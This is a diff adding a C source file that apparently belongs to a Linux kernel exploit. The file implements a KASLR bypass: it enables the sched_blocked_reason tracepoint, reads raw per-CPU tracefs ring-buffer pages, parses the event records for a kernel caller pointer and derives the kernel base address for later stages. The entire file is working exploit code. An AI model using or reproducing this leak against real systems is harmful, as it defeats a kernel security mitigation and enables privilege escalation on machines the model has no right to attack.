@@ -1,0 +1,137 @@
+#include "common.h"
+
+int kaslr_done;
+uint64_t kaslr_base;
+uintptr_t slide_p0_offset;
+
+int is_kernel_ptr(uintptr_t value) { return value >= 0xffff800000000000ULL; }
+
+int is_direct_ptr(uintptr_t value) { return value >= DIRECT_MAP_BASE && value < DIRECT_MAP_END; }
+
+uintptr_t text_addr(uintptr_t image_addr) {
+  if (!kaslr_done) {
+    return image_addr;
+  }
+  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
+}
+
+#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
+
+static int slide_tracefs_parse_page(const unsigned char *page, size_t page_len,
+                                    uintptr_t *candidate_out) {
+  if (page_len < 20) {
+    return 0;
+  }
+
+  uint64_t commit = 0;
+  memcpy(&commit, page + 8, sizeof(commit));
+  size_t data_len = (size_t)(commit & 0xfffULL);
+  size_t end = 16 + data_len;
+  if (end > page_len) {
+    end = page_len;
+  }
+
+  for (size_t pos = 16; pos + 4 <= end;) {
+    uint32_t event_header = 0;
+    memcpy(&event_header, page + pos, sizeof(event_header));
+    uint32_t type_len = event_header & 0x1fU;
+    if (type_len == 30) {
+      pos += 8;
+      continue;
+    }
+    if (type_len == 31) {
+      pos += 12;
+      continue;
+    }
+    if (type_len == 0 || type_len >= 29) {
+      break;
+    }
+
+    size_t record_len = (size_t)type_len * 4;
+    size_t record = pos + 4;
+    if (record + record_len > end) {
+      break;
+    }
+    uint16_t event_id = 0;
+    memcpy(&event_id, page + record, sizeof(event_id));
+    if (event_id == TRACEFS_EVENT_ID && record_len >= 24) {
+      uint64_t caller = 0;
+      memcpy(&caller, page + record + 16, sizeof(caller));
+      uint64_t link_caller = KIMAGE_TEXT_BASE + TRACEFS_WORKER_CALLER_OFF;
+      if (caller >= link_caller) {
+        uint64_t candidate = caller - link_caller;
+        if (candidate <= 0x4000000000ULL && (candidate & 0xffffULL) == 0) {
+          pr_success("discovered worker caller: caller=0x%016llx, candidate=0x%08llx\n",
+
+                     (unsigned long long)caller, (unsigned long long)candidate);
+          *candidate_out = (uintptr_t)candidate;
+          return 1;
+        }
+      }
+    }
+    pos = record + record_len;
+  }
+  return 0;
+}
+
+static void slide_commit(uintptr_t offset, const char *source) {
+  slide_p0_offset = offset;
+  kaslr_base = KIMAGE_TEXT_BASE + offset;
+  kaslr_done = 1;
+  pr_success(
+      "kaslr slide resolved: source=%s, pid=%d, base=0x%016llx, "
+      "p0_offset=0x%08zx\n",
+      source, getpid(), (unsigned long long)kaslr_base, slide_p0_offset);
+}
+
+static int slide_tracefs_leak_kernel_base(void) {
+  static const char tracing_on[] = SLIDE_TRACEFS_ROOT "/tracing_on";
+  static const char trace[] = SLIDE_TRACEFS_ROOT "/trace";
+  static const char event_enable[] = SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
+
+  if (!write_file_str(tracing_on, "0") || !write_file_str(event_enable, "1") ||
+      !write_file_str(tracing_on, "1")) {
+    pr_warning("failed to initialize tracefs subsystem: errno=%d\n", errno);
+    return 0;
+  }
+
+  int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
+  if (trace_fd >= 0) {
+    close(trace_fd);
+  }
+
+  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  uintptr_t candidate = 0;
+  int found = 0;
+  for (int attempt = 0; attempt < 5 && !found; attempt++) {
+    sleep(1);
+    for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
+      char path[128];
+      snprintf(path, sizeof(path), SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
+      int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
+      if (fd < 0) {
+        continue;
+      }
+      unsigned char page[4096];
+      ssize_t got;
+      while ((got = read(fd, page, sizeof(page))) > 0) {
+        if (slide_tracefs_parse_page(page, (size_t)got, &candidate)) {
+          found = 1;
+          break;
+        }
+      }
+      close(fd);
+    }
+  }
+  write_file_str(tracing_on, "0");
+  write_file_str(event_enable, "0");
+  if (!found) {
+    pr_warning("worker caller search exhausted after 5 iterations\n");
+    return 0;
+  }
+
+  slide_commit(candidate, "tracefs");
+  return 1;
+}
+
+int slide_leak_kernel_base(void) { return slide_tracefs_leak_kernel_base(); }
